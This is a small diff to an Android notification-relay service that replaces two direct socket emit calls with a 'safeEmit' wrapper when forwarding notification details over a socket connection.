@@ -134,7 +134,7 @@ public class NotificationRelayService extends NotificationListenerService {
                 data.put(Protocol.KEY_ID, sbn.getId());
                 data.put(Protocol.KEY_POST_TIME, sbn.getPostTime());
                 data.put(Protocol.KEY_TIMESTAMP, System.currentTimeMillis());
-                SocketClient.getInstance().getSocket().emit(Protocol.NOTIF, data);
+                SocketClient.getInstance().safeEmit(Protocol.NOTIF, data);
             } catch (Exception ignored) {}
         });
     }
@@ -164,7 +164,7 @@ public class NotificationRelayService extends NotificationListenerService {
                 data.put(Protocol.KEY_CATEGORY, n.category);
             }
 
-            SocketClient.getInstance().getSocket().emit(Protocol.NOTIF, data);
+            SocketClient.getInstance().safeEmit(Protocol.NOTIF, data);
         } catch (Exception ignored) {}
     }
 
